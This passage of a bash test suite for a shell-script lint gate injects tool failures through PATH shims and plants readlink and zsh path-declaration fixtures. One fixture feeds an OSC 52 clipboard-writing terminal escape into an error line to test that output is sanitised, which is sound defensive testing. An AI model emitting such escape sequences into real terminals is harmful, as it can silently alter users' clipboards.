# (printf %b escapes) ends its error line, to plant control bytes there.
_argfail_shim() {
  mkdir -p "$1"
  {
    printf '#!/bin/sh\n'
    printf 'for a in "$@"; do\n'
    printf '  if [ "$a" = "$ARG_FAIL_ON" ]; then printf "%%s: simulated failure%%b\\n" "%s" "${ARG_FAIL_TAIL:-}" >&2; exit "${ARG_FAIL_RC:-2}"; fi\n' "$2"
    printf 'done\n'
    printf 'exec "%s" "$@"\n' "$(command -v "$2")"
  } > "$1/$2"
  chmod u+x "$1/$2"
  [ "$(PATH="$1:$PATH" bash -c "command -v $2")" = "$1/$2" ] \
    || fail "the $2 shim is not the $2 a fresh process resolves"
}
sed_fail="$work/argfail-sed"; _argfail_shim "$sed_fail" sed
grep_fail="$work/argfail-grep"; _argfail_shim "$grep_fail" grep
sort_fail="$work/argfail-sort"; _argfail_shim "$sort_fail" sort
# _code_of's sed failing, once per arm that re-tests CODE (5-10). Its empty
# answer used to read as "a comment only line", so each planted violation
# passed with exit 0 and no output (measured on arm 5 before the fix). Each
# fixture first exits 1 with its arm's message under the real sed, so the
# shimmed run proves the split, not a clean tree.
# The shapes go through $P, $D and a doubled backslash (see _plug_case), so
# this file carries none of what arms 8-10 read in tests/.
split_err_msg="check-patterns: the code/comment split (sed) errored"
split_arm=0
while IFS='|' read -r split_file split_msg split_line; do
  split_arm=$((split_arm + 1))
  r="$work/split-fail-$split_arm"; seed "$r"; mkdir -p "$r/$(dirname "$split_file")"
  printf '%s\n' "$split_line" > "$r/$split_file"
  _gate_rc "$cp" "$r"
  [ "$gate_rc" = "1" ] || fail "split fixture $split_file: the real gate must exit 1, got $gate_rc: $gate_out"
  case "$gate_out" in
    *"$split_msg"*) ;;
    *) fail "split fixture $split_file: expected '$split_msg' from the real gate, got: $gate_out" ;;
  esac
  _gate_rc "$cp" "$r" PATH="$sed_fail:$PATH" ARG_FAIL_ON='s/^[^:]*:[0-9]+://' ARG_FAIL_RC=1
  [ "$gate_rc" = "2" ] && ok \
    || fail "a failing code/comment split on $split_file must exit 2, got $gate_rc: $gate_out"
  case "$gate_out" in
    *"$split_err_msg"*"$r/$split_file:1:"* | *"$r/$split_file:1:"*"$split_err_msg"*) ok ;;
    *) fail "a failing code/comment split on $split_file must report itself AND the hit: $gate_out" ;;
  esac
done <<SPLIT
lib/p.sh|check-patterns: hardcoded Homebrew prefix|P=/opt/homebrew
lib/b.sh|check-patterns: a 'brew shellenv' / 'brew --prefix' fork|eval "\$(brew shellenv)"
lib/m.sh|check-patterns: bash 4 syntax in the bash-3.2 surface|declare -A m
lib/g.sh|check-patterns: a GNU-only regex escape|sed -e 's/\\s//' f
lib/e.sh|check-patterns: an early-exit reader|x $P grep -q y
lib/d.sh|check-patterns: a '--' after the first operand|chmod -R go-w $D "\$d"
lib/r.sh|$rl_msg|t=\$(readlink f)
zsh/t.zsh|$tied_msg|  local path=/x
SPLIT
[ "$split_arm" -eq 8 ] || fail "the code/comment split cases: expected 8 arms, ran $split_arm"
# _retest trusts a re-test only as a count grep printed that agrees with its
# status. A grep shim answers every `-cE` call (the match and the exemption
# re-tests) with a status and a count that do not fit: each is an error,
# exit 2, never "no match" (the hit dropped) or a match that then exempts it.
cnt_shim="$work/grep-count-shim"; mkdir -p "$cnt_shim"
{
  printf '#!/bin/sh\n'
  printf 'for a in "$@"; do if [ "$a" = -cE ]; then printf "%%s" "$CNT_OUT"; exit "$CNT_RC"; fi; done\n'
  printf 'exec "%s" "$@"\n' "$(command -v grep)"
} > "$cnt_shim/grep"
chmod u+x "$cnt_shim/grep"
for cnt in '0|' '0|0' '1|1' '0|1x' '1|0x'; do
  _gate_rc "$cp" "$work/split-fail-1" PATH="$cnt_shim:$PATH" CNT_RC="${cnt%%|*}" CNT_OUT="${cnt#*|}"
  [ "$gate_rc" = "2" ] && ok \
    || fail "a re-test grep exiting ${cnt%%|*} with count '${cnt#*|}' must exit 2, got $gate_rc: $gate_out"
  case "$gate_out" in
    *"check-patterns: code re-test errored"*) ok ;;
    *) fail "a re-test grep exiting ${cnt%%|*} with count '${cnt#*|}' must report the re-test error: $gate_out" ;;
  esac
done
# the path filters of arms 2, 5 and 11 (grep -v) erroring: `|| true` used to
# read that as "every hit exempted", exit 0. A filter that cannot run
# exempts nothing: the hit prints, and the exit is 2. Two ways to fail: grep
# itself (its error line, carrying OSC 52, must print escaped right above
# the filter's message: its stderr, through the sanitizer), and grep never
# running because its stderr file cannot be opened (a mktemp shim makes
# drop.err a directory): bash then returns 1, grep's own "every line
# dropped", which passed all three violations with exit 0.
filter_err_msg="exemption filter (grep -v) errored"
filter_x='grep: simulated failure\x1b]52;c;aGk=\x07'
drop_shim="$work/mktemp-drop-shim"; mkdir -p "$drop_shim"
{
  printf '#!/bin/sh\n'
  printf 'case "$*" in *check-patterns.XXXXXX*) d="$("%s" "$@")" || exit $?; mkdir "$d/drop.err" || exit 1; printf "%%s\\n" "$d"; exit 0 ;; esac\n' "$(command -v mktemp)"
  printf 'exec "%s" "$@"\n' "$(command -v mktemp)"
} > "$drop_shim/mktemp"
chmod u+x "$drop_shim/mktemp"
filter_n=0
while IFS='|' read -r filter_file filter_label filter_msg filter_line; do
  filter_n=$((filter_n + 1))
  r="$work/filter-fail-$filter_n"; seed "$r"; mkdir -p "$r/$(dirname "$filter_file")"
  printf '%s\n' "$filter_line" > "$r/$filter_file"
  _gate_rc "$cp" "$r"
  [ "$gate_rc" = "1" ] || fail "filter fixture $filter_file: the real gate must exit 1, got $gate_rc: $gate_out"
  for filter_how in grep drop.err; do
    if [ "$filter_how" = grep ]; then
      _gate_rc "$cp" "$r" PATH="$grep_fail:$PATH" ARG_FAIL_ON=-vE ARG_FAIL_TAIL='\033]52;c;aGk=\007'
    else
      _gate_rc "$cp" "$r" PATH="$drop_shim:$PATH"
    fi
    [ "$gate_rc" = "2" ] && ok \
      || fail "a failing exemption filter ($filter_how) on $filter_file must exit 2, got $gate_rc: $gate_out"
    case "$gate_out" in
      *"check-patterns: the $filter_label $filter_err_msg"*) ok ;;
      *) fail "a failing exemption filter ($filter_how) on $filter_file must report itself: $gate_out" ;;
    esac
    case "$gate_out" in
      *"$r/$filter_file:1:"*"$filter_msg"*) ok ;;
      *) fail "a failing exemption filter ($filter_how) on $filter_file must still report the hit and '$filter_msg': $gate_out" ;;
    esac
  done
  case "$gate_out" in
    *$'\033'*) fail "a failing exemption filter on $filter_file: a raw ESC reached the output: $gate_out" ;;
  esac
  _gate_rc "$cp" "$r" PATH="$grep_fail:$PATH" ARG_FAIL_ON=-vE ARG_FAIL_TAIL='\033]52;c;aGk=\007'
  case "$gate_out" in
    *$'\033'*) fail "a failing exemption filter (grep) on $filter_file: a raw ESC reached the output: $gate_out" ;;
    *"$filter_x"$'\n'"check-patterns: the $filter_label $filter_err_msg"*) ok ;;
    *) fail "a failing exemption filter (grep) on $filter_file: expected its escaped error line right above its message, got: $gate_out" ;;
  esac
done <<FILTER
lib/u.sh|lib/os.sh|check-patterns: ad-hoc 'uname -m'|x=\$(uname -m)
lib/p.sh|gpg-agent.conf|check-patterns: hardcoded Homebrew prefix|P=/opt/homebrew
docs/x.md|lazy-lock.json|check-patterns: an em dash (U+2014) in repo prose|a ${em_dash} b
FILTER
[ "$filter_n" -eq 3 ] || fail "the exemption filter cases: expected 3 arms, ran $filter_n"
# a command failing where the gate does NOT check its status: set -e used to
# exit with that command's own status, and a 1 reads as "a violation" with no
# report at all. The ERR trap makes it exit 2, a scan error. Two sites, both
# in the main shell: _re_escape's sed (a clean tree, so nothing else fires)
# and arm 8's sort (a real hit, whose report the failure drops).
unchecked_msg="check-patterns: a command failed where the gate does not check its status"
r="$work/unchecked-reesc"; seed "$r"
[ "$(run "$r")" = "0" ] || fail "the unchecked-failure fixture must pass the real gate"
PATH="$sed_fail:$PATH" ARG_FAIL_ON='s/[].[(){}^$*+?|\]/\\&/g' ARG_FAIL_RC=1 \
  fails_with_rc 2 "$r" "$unchecked_msg" "an unchecked sed failure (_re_escape) must exit 2" only
r="$work/unchecked-sort"; seed "$r"
printf '%s\n' "sed -e 's/\\s//' f" > "$r/lib/g.sh"
_gate_rc "$cp" "$r" PATH="$sort_fail:$PATH" ARG_FAIL_ON=-k2,2n ARG_FAIL_RC=1
[ "$gate_rc" = "2" ] && ok || fail "an unchecked sort failure (arm 8) must exit 2, got $gate_rc: $gate_out"
case "$gate_out" in
  *"$unchecked_msg"*) ok ;;
  *) fail "an unchecked sort failure (arm 8) must say so: $gate_out" ;;
esac
# ... and inside a FUNCTION the main shell calls: without `set -E` the trap
# does not reach it and `set -e` exits with the command's own status. No
# function of the gate runs an unchecked external command today, so a copy
# of the gate plants a `false` at the top of _scan_roots.
unchecked_fn="$work/unchecked-fn-gate"
sed 's|^_scan_roots() {$|&\
  false|' "$cp" > "$unchecked_fn"
chmod u+x "$unchecked_fn"
[ "$(grep -c -x -e '  false' "$unchecked_fn")" = 1 ] \
  || fail "the unchecked-function gate copy: the sed edit did not land exactly once"
_gate_rc "$unchecked_fn" "$work/unchecked-reesc"
[ "$gate_rc" = "2" ] && ok || fail "an unchecked failure inside a function must exit 2, got $gate_rc: $gate_out"
case "$gate_out" in
  *"$unchecked_msg (exit 1,"*) ok ;;
  *) fail "an unchecked failure inside a function must say so: $gate_out" ;;
esac
# The ERR trap acts in the main shell only, because bash 3.2 fires ERR in a
# `$(...)` even when the caller checks its status: without that guard a
# clean tree exits 2 under 3.2 (measured locally on bash 3.2.57). The gate
# starts through `env bash`, which need not be 3.2 even on a mac, so this
# runs the gate under a 3.x bash explicitly: /bin/bash (3.2 on the macOS
# legs) or the bash on PATH. With neither, a loud SKIP: the guard is then
# proven only where such a bash exists.
b3=""
for b3_c in /bin/bash "$(command -v bash)"; do
  if [ -x "$b3_c" ] && [ "$("$b3_c" -c 'echo "${BASH_VERSINFO[0]}"' 2>/dev/null || true)" = 3 ]; then
    b3="$b3_c"; break
  fi
done
if [ -n "$b3" ]; then
  gate_rc=0; gate_out="$(STRICT= "$b3" "$cp" "$work/unchecked-reesc" 2>&1)" || gate_rc=$?
  [ "$gate_rc" = "0" ] && ok || fail "a clean tree under $b3 (bash 3) must exit 0, got $gate_rc: $gate_out"
  gate_rc=0; gate_out="$(STRICT= "$b3" "$cp" "$work/split-fail-1" 2>&1)" || gate_rc=$?
  [ "$gate_rc" = "1" ] && ok || fail "a violation under $b3 (bash 3) must exit 1, got $gate_rc: $gate_out"
  case "$gate_out" in
    *"check-patterns: hardcoded Homebrew prefix"*) ok ;;
    *) fail "a violation under $b3 (bash 3) must be reported: $gate_out" ;;
  esac
else
  echo "  SKIP: no bash 3.x at /bin/bash or on PATH - the ERR trap's subshell guard is not exercised under the bash it exists for"
fi
# An inherited GREP_OPTIONS reaches every grep of the gate: BSD grep (macOS)
# honours it, GNU grep 3.6+ ignores it. A grep shim stands in for BSD's,
# failing any call that still sees one: the gate unsets it.
go_shim="$work/grep-options-shim"; mkdir -p "$go_shim"
{
  printf '#!/bin/sh\n'
  printf 'if [ -n "${GREP_OPTIONS:-}" ]; then echo "grep: GREP_OPTIONS reached grep" >&2; exit 2; fi\n'
  printf 'exec "%s" "$@"\n' "$(command -v grep)"
} > "$go_shim/grep"
chmod u+x "$go_shim/grep"
PATH="$go_shim:$PATH" GREP_OPTIONS=-I \
  fails_with_rc 1 "$work/split-fail-1" "check-patterns: hardcoded Homebrew prefix" "an inherited GREP_OPTIONS must not reach the gate's greps" only

# === arm (13): a raw readlink in install.sh/lib/ outside _link_readlink ======
# $(readlink) strips a target's trailing newline, and BSD readlink's own
# terminator differs from GNU's, so install.sh and lib/ read a link target
# only through lib/link.sh's _link_readlink. The exemption is the helper's
# exact call line inside that function's body in that exact file, found at
# scan time: never a line number, a file, or a name defined elsewhere.
_rl_helper() {  # $1 = file: the helper, and a caller of it
  printf '%s\n' \
    '# _link_readlink DEST - a comment that names readlink and $(readlink)' \
    '_link_readlink() {' \
    '  local t' \
    '  t="$(readlink -n "$1" && printf x)" || return 1' \
    "  printf '%s' \"\${t%x}\"" \
    '}' \
    '' \
    '_link_target_is() {' \
    '  local t' \
    '  t="$(_link_readlink "$1" && printf x)" || return 1' \
    '  [ "${t%x}" = "$2" ]' \
    '}' > "$1"
}
# _fails_at ROOT MESSAGE HIT LABEL - exit exactly 1 with MESSAGE as the only
# check-patterns line, and HIT (PATH:NN:) among the reported lines: the arm
# fired on the planted line, not on some other one.
_fails_at() {
  fails_with_rc 1 "$1" "$2" "$4" only
  _gate_rc "$cp" "$1"
  case "$gate_out" in
    *"$3"*) ok ;;
    *) fail "$4: expected the hit '$3', got: $gate_out" ;;
  esac
}
r="$work/rl-helper-ok"; seed "$r"; _rl_helper "$r/lib/link.sh"
[ "$(run "$r")" = "0" ] && ok || fail "the raw readlink inside _link_readlink's body must pass"
# today's real lib/ passes as is (the helper's raw call is its only one)
r="$work/rl-real-lib"; mkdir -p "$r/lib"
for f in "$repo_root"/lib/*.sh; do cat "$f" > "$r/lib/${f##*/}"; done
[ "$(run "$r")" = "0" ] && ok || fail "today's lib/*.sh must pass the raw-readlink arm"
# an inner brace group's indented `}` does not end the body: only a `}` at
# column 0 closes it
r="$work/rl-inner-brace"; seed "$r"
printf '%s\n' '_link_readlink() {' '  {' '    local t' '  }' \
  '  t="$(readlink -n "$1" && printf x)" || return 1' "  printf '%s' \"\${t%x}\"" '}' > "$r/lib/link.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a raw readlink after an inner brace group of _link_readlink must pass"
# the helper's raw call is live: renamed away, the same file fails
r="$work/rl-helper-renamed"; seed "$r"; _rl_helper "$r/lib/link.sh"
sed 's/^_link_readlink() {$/_link_readlink_old() {/' "$r/lib/link.sh" > "$r/lib/link.tmp"
cat "$r/lib/link.tmp" > "$r/lib/link.sh"; rm -f "$r/lib/link.tmp"
_fails_at "$r" "$rl_msg" "$r/lib/link.sh:4:" "a helper renamed away from _link_readlink exempts nothing"

# every raw shape is caught in any lib/ file, at any depth
i=0
while IFS= read -r line; do
  i=$((i + 1)); r="$work/rl-shape-$i"; seed "$r"; _rl_helper "$r/lib/link.sh"
  mkdir -p "$r/lib/sub"
  printf '%s\n' "$line" > "$r/lib/sub/x.sh"
  fails_with_rc 1 "$r" "$rl_msg" "a raw readlink in lib/sub/x.sh must fail: $line" only
done <<'SHAPES'
t=$(readlink "$1")
readlink -n "$1"
t=`readlink "$1"`
t="$(command readlink -n "$1" && printf x)"
t=$(/usr/bin/readlink "$1")
t=$(greadlink -f "$1")
[ "$(readlink "$d")" = "$want" ] && return 0
x=1; readlink "$d"  # not through _link_readlink
SHAPES

# NOT raw: a comment that names it, a call of the helper, a longer word
r="$work/rl-negatives"; seed "$r"; _rl_helper "$r/lib/link.sh"
printf '%s\n' '# $(readlink) alone would strip a trailing newline' \
  't="$(_link_readlink "$d" && printf x)"; t="${t%x}"  # not $(readlink)' \
  'readlink_out=1; my-readlink-note=2' 'x=1;# readlink here is prose' > "$r/lib/u.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a comment naming readlink, a _link_readlink call and a longer word must pass"
# KNOWN FALSE POSITIVES, pinned so a change is noticed: text matching, so
# the word in a string or as a name is flagged too (the header says so)
for rl_fp in 'echo "readlink"' 'readlink=x'; do
  r="$work/rl-fp-$(printf '%s' "$rl_fp" | tr -c 'a-z' '-')"; seed "$r"
  printf '%s\n' "$rl_fp" > "$r/lib/x.sh"
  _fails_at "$r" "$rl_msg" "$r/lib/x.sh:1:" "the known false positive '$rl_fp' is flagged"
done
# a standalone `command greadlink` is a raw call too
r="$work/rl-command-greadlink"; seed "$r"
printf 'command greadlink -f "$1"\n' > "$r/lib/x.sh"
_fails_at "$r" "$rl_msg" "$r/lib/x.sh:1:" "a standalone command greadlink must fail"
# the surface is install.sh and lib/: install.sh sources lib/link.sh, so it
# is held to the same rule; bin/ and zsh/ are not scanned
r="$work/rl-install"; seed "$r"; _rl_helper "$r/lib/link.sh"
printf '#!/bin/sh\nt=$(readlink "$1")\n' > "$r/install.sh"
_fails_at "$r" "$rl_msg" "$r/install.sh:2:" "a raw readlink in install.sh must fail"
r="$work/rl-surface"; seed "$r"; mkdir -p "$r/bin" "$r/zsh"
printf '#!/bin/sh\nt=$(readlink "$1")\n' > "$r/bin/tool"
printf 't=$(readlink "$1")\n' > "$r/zsh/x.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a raw readlink in bin/ or zsh/ is off the arm's surface"

# The exemption is ONE line: the helper's exact call inside the body of the
# one `_link_readlink() {` in exactly lib/link.sh. Each fixture below widens
# it one way and must fail at the planted line (exit 1), or, where which body
# is the helper is ambiguous, fail closed (exit 2).
rl_x='  t="$(readlink -n "$1" && printf x)" || return 1'
rl_refuse="check-patterns: the _link_readlink exemption lookup (awk) cannot trust lib/link.sh"
# _refuses ROOT WHY LABEL - exit exactly 2 with the refusal naming WHY, and
# the helper's own call reported: exempting nothing.
_refuses() {
  fails_with_rc 2 "$1" "$rl_refuse ($2" "$3"
  _gate_rc "$cp" "$1"
  case "$gate_out" in
    *"$1/lib/link.sh:"*"$rl_msg"*) ok ;;
    *) fail "$3: a refused lookup must exempt nothing: $gate_out" ;;
  esac
}
# a comment line naming the definition shape is not a definition
r="$work/rl-comment-def"; seed "$r"
printf '%s\n' '# _link_readlink() { is the one helper' '_link_readlink() {' "$rl_x" '}' > "$r/lib/link.sh"
[ "$(run "$r")" = "0" ] && ok || fail "a comment naming '_link_readlink() {' must not count as a definition"
# (a) another function of lib/link.sh, after the helper
r="$work/rl-other-fn"; seed "$r"; _rl_helper "$r/lib/link.sh"
printf '%s\n' '_link_other() {' '  t=$(readlink "$1")' '}' >> "$r/lib/link.sh"
_fails_at "$r" "$rl_msg" "$r/lib/link.sh:14:" "a raw readlink in another function of lib/link.sh must fail"
# (b) the line right after the helper's closing brace
r="$work/rl-after-close"; seed "$r"
printf '%s\n' '_link_readlink() {' "$rl_x" '}' 't=$(readlink "$1")' > "$r/lib/link.sh"
_fails_at "$r" "$rl_msg" "$r/lib/link.sh:4:" "a raw readlink right after the helper's closing brace must fail"
# (c) before the helper
r="$work/rl-before"; seed "$r"
printf '%s\n' 't=$(readlink "$1")' '_link_readlink() {' "$rl_x" '}' > "$r/lib/link.sh"
_fails_at "$r" "$rl_msg" "$r/lib/link.sh:1:" "a raw readlink before the helper must fail"
# (d) the same function name defined in another lib/ file
r="$work/rl-other-file"; seed "$r"; _rl_helper "$r/lib/link.sh"
_rl_helper "$r/lib/other.sh"
_fails_at "$r" "$rl_msg" "$r/lib/other.sh:4:" "_link_readlink defined outside lib/link.sh is not exempt"
# (e) a decoy lib/sub/link.sh: the exemption is the EXACT scanned path
r="$work/rl-decoy"; seed "$r"; _rl_helper "$r/lib/link.sh"
mkdir -p "$r/lib/sub"; _rl_helper "$r/lib/sub/link.sh"
_fails_at "$r" "$rl_msg" "$r/lib/sub/link.sh:4:" "a decoy lib/sub/link.sh must not share the exemption"
# (f) the same LINE NUMBER as the helper's call, in another file
r="$work/rl-same-lineno"; seed "$r"; _rl_helper "$r/lib/link.sh"
printf '%s\n' ':' ':' ':' 't=$(readlink "$1")' > "$r/lib/x.sh"
_fails_at "$r" "$rl_msg" "$r/lib/x.sh:4:" "a raw readlink at the helper's line number in another file must fail"
# (g) a body with no closing brace exempts nothing
r="$work/rl-open-body"; seed "$r"
printf '%s\n' '_link_readlink() {' "$rl_x" > "$r/lib/link.sh"
_fails_at "$r" "$rl_msg" "$r/lib/link.sh:2:" "a helper body with no closing brace must exempt nothing"
# (h) the body closes ONLY on an exact `}` at column 0: any other column-0
# line voids it, so the next function's readlink is not swallowed
for rl_close in '} # end' '} 2>/dev/null'; do
  r="$work/rl-close-$(printf '%s' "$rl_close" | tr -c 'a-z0-9' '-')"; seed "$r"
  printf '%s\n' '_link_readlink() {' "$rl_x" "$rl_close" '_link_other() {' '  readlink "$1"' '}' > "$r/lib/link.sh"
  _fails_at "$r" "$rl_msg" "$r/lib/link.sh:5:" "a helper closed by '$rl_close' must not extend into the next function"
  _fails_at "$r" "$rl_msg" "$r/lib/link.sh:2:" "a helper closed by '$rl_close' is void: its own call is not exempt"
done
r="$work/rl-close-indented"; seed "$r"
printf '%s\n' '_link_readlink() {' "$rl_x" '  }' '_link_other() {' '  readlink "$1"' '}' > "$r/lib/link.sh"
_fails_at "$r" "$rl_msg" "$r/lib/link.sh:5:" "an indented close must not extend the helper into the next function"
# (i) only the helper's EXACT call is exempt, never another shape in its body
r="$work/rl-body-shape"; seed "$r"
printf '%s\n' '_link_readlink() {' "$rl_x" '  readlink -f "$1"' '}' > "$r/lib/link.sh"
_fails_at "$r" "$rl_msg" "$r/lib/link.sh:3:" "another readlink shape inside the helper's body must fail"
r="$work/rl-body-shape-first"; seed "$r"
printf '%s\n' '_link_readlink() {' '  readlink -f "$1"' "$rl_x" '}' > "$r/lib/link.sh"
_fails_at "$r" "$rl_msg" "$r/lib/link.sh:2:" "another readlink shape BEFORE the helper's call must fail"
# (j) an EMPTY helper body exempts nothing; a raw call elsewhere fails
r="$work/rl-empty-body"; seed "$r"
printf '%s\n' '_link_readlink() {' '}' > "$r/lib/link.sh"
printf 'readlink "$1"\n' > "$r/lib/x.sh"
_fails_at "$r" "$rl_msg" "$r/lib/x.sh:1:" "with an empty helper body a raw call elsewhere must fail"
# (k) no lib/link.sh at all: nothing to exempt, not ambiguous (exit 1)
r="$work/rl-no-linksh"; seed "$r"
printf 'readlink "$1"\n' > "$r/lib/x.sh"
_fails_at "$r" "$rl_msg" "$r/lib/x.sh:1:" "with no lib/link.sh a raw call must fail"
# AMBIGUOUS, fail closed (exit 2): more than one definition-shaped line
# (a duplicate, one inside a heredoc), or the one not in the exact form (a
# trailing comment, one line, indented)
r="$work/rl-dup"; seed "$r"; _rl_helper "$r/lib/link.sh"; _rl_helper "$r/lib/link.tmp"
cat "$r/lib/link.tmp" >> "$r/lib/link.sh"; rm -f "$r/lib/link.tmp"
_refuses "$r" "2 definition-shaped" "a duplicate _link_readlink definition must fail closed"
r="$work/rl-heredoc"; seed "$r"
printf '%s\n' 'cat <<EOF' '_link_readlink() {' 'EOF' '_link_readlink() {' "$rl_x" '}' > "$r/lib/link.sh"
_refuses "$r" "2 definition-shaped" "a definition line inside a heredoc must fail closed"
r="$work/rl-def-comment"; seed "$r"
printf '%s\n' '_link_readlink() { # the helper' "$rl_x" '}' > "$r/lib/link.sh"
_refuses "$r" "line 1 is not the exact" "a definition line with a trailing comment must fail closed"
r="$work/rl-oneline"; seed "$r"
printf '%s\n' '_link_readlink() { readlink -n "$1"; }' > "$r/lib/link.sh"
_refuses "$r" "line 1 is not the exact" "a one-line _link_readlink must fail closed"
r="$work/rl-indented"; seed "$r"
printf '%s\n' 'outer() {' '  _link_readlink() {' "  $rl_x" '  }' '}' > "$r/lib/link.sh"
_refuses "$r" "line 2 is not the exact" "an indented _link_readlink must fail closed"
# (l) a FILE NAMED lib/link.sh:4:x prints its hits as `.../lib/link.sh:4:x:1:`,
# which the exact-path, line-4 exemption ERE also matches, dropping the hit.
# It is safe only because the file-name pass refuses any name holding `:`
# (exit 2): pinned here, so neither half is loosened alone.
r="$work/rl-colon-name"; seed "$r"; _rl_helper "$r/lib/link.sh"
printf 'readlink "$1"\n' > "$r/lib/link.sh:4:x"
fails_with_rc 2 "$r" "$names_msg" "a lib/link.sh:4:x file name must fail closed through the name pass"

# FAIL CLOSED: the scan's grep, the body lookup's awk and the exemption
# filter each failing exits 2, and a lookup that cannot run exempts nothing.
rl_scan_err="check-patterns: raw-readlink scan errored"
rl_awk_err="check-patterns: the _link_readlink exemption lookup (awk) cannot trust lib/link.sh"
# _patfail_shim DIR - a grep that fails (exit 2) on the RECURSIVE call whose
# arguments hold $PAT_FAIL_ON, and runs the real grep otherwise: the re-tests
# (-cE) and every other arm's calls are untouched.
_patfail_shim() {
  mkdir -p "$1"
  {
    printf '#!/bin/sh\n'
    printf 'if [ "$1" = -rHnaE ]; then for a in "$@"; do case "$a" in *"$PAT_FAIL_ON"*) echo "grep: simulated failure" >&2; exit 2 ;; esac; done; fi\n'
    printf 'exec "%s" "$@"\n' "$(command -v grep)"
  } > "$1/grep"
  chmod u+x "$1/grep"
  [ "$(PATH="$1:$PATH" bash -c 'command -v grep')" = "$1/grep" ] \
    || fail "the pattern-failing grep shim is not the grep a fresh process resolves"
}
patfail="$work/patfail-grep"; _patfail_shim "$patfail"
r="$work/rl-grep-fail"; seed "$r"; _rl_helper "$r/lib/link.sh"
[ "$(run "$r")" = "0" ] || fail "the raw-readlink grep-fault fixture must pass the real gate"
PATH="$patfail:$PATH" PAT_FAIL_ON=readlink \
  fails_with_rc 2 "$r" "$rl_scan_err" "a failing raw-readlink scan must exit 2" only
# awk: a stand-in that answers $AWK_OUT with status $AWK_RC
awk_shim="$work/awk-shim"; mkdir -p "$awk_shim"
printf '#!/bin/sh\necho "awk: simulated failure" >&2\nprintf "%%s\\n" "$AWK_OUT"\nexit "$AWK_RC"\n' > "$awk_shim/awk"
chmod u+x "$awk_shim/awk"
[ "$(PATH="$awk_shim:$PATH" bash -c 'command -v awk')" = "$awk_shim/awk" ] \
  || fail "the awk shim is not the awk a fresh process resolves"
r="$work/rl-awk-fail"; seed "$r"; _rl_helper "$r/lib/link.sh"
printf 't=$(readlink "$1")\n' > "$r/lib/x.sh"
fails_with_rc 1 "$r" "$rl_msg" "the awk-fault fixture must fail the real gate with its violation"
for aw in '2|4' '0|4|x' '0||4' '0|4|' '0|4||5' '0|x' '0|04' '0|4 5'; do
  _gate_rc "$cp" "$r" PATH="$awk_shim:$PATH" AWK_RC="${aw%%|*}" AWK_OUT="${aw#*|}"
  [ "$gate_rc" = "2" ] && ok \
    || fail "an awk exiting ${aw%%|*} with '${aw#*|}' must exit 2, got $gate_rc: $gate_out"
  case "$gate_out" in
    *"$rl_awk_err"*) ok ;;
    *) fail "an awk exiting ${aw%%|*} with '${aw#*|}' must report the lookup error: $gate_out" ;;
  esac
  # exempting nothing: the helper's own raw call prints with the violation
  for rl_want in "$r/lib/link.sh:4:" "$r/lib/x.sh:1:" "$rl_msg"; do
    case "$gate_out" in
      *"$rl_want"*) ok ;;
      *) fail "an awk exiting ${aw%%|*} with '${aw#*|}' must exempt nothing (no '$rl_want'): $gate_out" ;;
    esac
  done
done
# the exemption filter (_drop_hits' grep -v): its own failure, and grep never
# running because its stderr file cannot be opened
for rl_how in grep drop.err; do
  if [ "$rl_how" = grep ]; then
    _gate_rc "$cp" "$r" PATH="$grep_fail:$PATH" ARG_FAIL_ON=-vE
  else
    _gate_rc "$cp" "$r" PATH="$drop_shim:$PATH"
  fi
  [ "$gate_rc" = "2" ] && ok \
    || fail "a failing _link_readlink exemption filter ($rl_how) must exit 2, got $gate_rc: $gate_out"
  for rl_want in "check-patterns: the _link_readlink line $filter_err_msg" \
      "$r/lib/link.sh:4:" "$r/lib/x.sh:1:" "$rl_msg"; do
    case "$gate_out" in
      *"$rl_want"*) ok ;;
      *) fail "a failing _link_readlink exemption filter ($rl_how) must report itself and exempt nothing (no '$rl_want'): $gate_out" ;;
    esac
  done
done

# === arm (14): a localizing declaration of zsh's path specials ===============
# `local path` in a function keeps the special tie, so assigning it rewrites
# $PATH for the whole call. A line scanner cannot tell a function body from
# the top level, so every declaration of the ten names without -g fails.
i=0
while IFS= read -r line; do
  i=$((i + 1)); r="$work/tied-shape-$i"; seed "$r"; mkdir -p "$r/zsh/sub"
  printf '%s\n' "$line" > "$r/zsh/sub/x.zsh"
  fails_with_rc 1 "$r" "$tied_msg" "a localizing declaration must fail: $line" only
done <<'SHAPES'
f() { local path=/x; }
  local -a path
  local path
  local cdpath
  local FPATH=/x
  local x path y
  local x=${y} path
  local -- path
  typeset -U path
  typeset -x PATH=/x
  typeset +g path
  typeset -g x; local path
  typeset -gU path; local path
  declare fpath
  integer manpath
  float MANPATH
  readonly CDPATH
  private path
  (( 1 )) && local path=/x
  local -g path
  local module_path=/x
  typeset MODULE_PATH
  for path in /a /b; do :; done
  for x path (/a /b) :
  foreach path (/a /b)
  select PATH in a b; do :; done
  for fpath in /x; do :; done
  for module_path in /x; do :; done
  x=1; for i path in a b; do :; done
  if true; then local path; fi
SHAPES
# the dot entries of zsh/ are on the surface too
r="$work/tied-dot"; seed "$r"; mkdir -p "$r/zsh"
printf '  local path=/x\n' > "$r/zsh/.zshrc.local.example"
fails_with_rc 1 "$r" "$tied_msg" "a localizing declaration in a zsh/ dot file must fail" only
# NOT a localizing declaration: -g in any option word, a plain assignment,
# export, a comment, a longer name, a zstyle value
r="$work/tied-negatives"; seed "$r"; mkdir -p "$r/zsh"
printf '%s\n' 'typeset -gU path' 'typeset -Ug path' 'typeset -U -g path fpath' \
  'typeset -gx PATH' 'path=("$HOME/.local/bin" $path)' \
  'if [[ -d /usr/local/go/bin ]]; then path=(/usr/local/go/bin $path); fi' \
  'export PATH=/x' '# `target`, not `path`: a `local path` corrupts PATH' \
  'x=1  # never local path here' 'local pathx mypath path_list target' \
  "zstyle ':completion:*' tag-order local-directories path-directories" \
  'print "use local path"' 'print -r -- nolocal path; mytypeset path' \
  'typeset -xg path' 'for d in path fpath; do :; done' 'for p in $path; do :; done' \
  'for p ($path) :' 'for inx in path; do :; done' 'for i in path; do :; done' \
  'before path' > "$r/zsh/ok.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "-g declarations, assignments, export, comments and longer names must pass"
# NOT COVERED, pinned as uncaught (the arm's comment lists them): a name word
# holding `(`, `)`, `;`, `&` or `|` ends the scan of the line, quoting or
# escaping hides a name, and mailpath is not one of the names. If a change
# starts catching one, move it to the shapes above and out of the comment.
while IFS= read -r line; do
